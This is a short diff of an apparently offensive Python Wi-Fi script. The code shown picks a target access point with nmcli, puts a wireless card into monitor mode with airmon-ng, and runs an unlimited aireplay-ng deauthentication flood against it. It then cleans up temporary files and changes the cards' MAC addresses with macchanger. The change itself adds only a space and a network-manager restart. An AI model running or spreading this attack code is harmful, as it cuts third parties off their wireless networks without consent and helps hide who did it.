@@ -84,7 +84,7 @@ else:
   os.system("card=`cat cardm.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname wlan1 | awk '{print FS2 $2}' | sed '2p; d' > targ")
   os.system('card=`cat carda.sh` && ch=`cat chan` && airmon-ng start $card $ch')
   
-  os.system('card=`cat carda.sh`mon && target=`cat targ` && aireplay-ng -0 0 -a $target $card')
+  os.system('card=`cat carda.sh`mon && target=`cat targ` && aireplay-ng -0 0 -a $target  $card')
   print("Wait..")
   os.system('card=`cat carda.sh`mon && airmon-ng stop $card')
   
@@ -96,3 +96,4 @@ print("Return configurations: ")
 os.system('rm choose && rm chan && rm card.* && rm targ')
 os.system('card=`cat carda.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
 os.system('card=`cat cardm.sh` && ifconfig $card down && macchanger -p $card && ifconfig $card up')
+os.system('service network-manager restart')
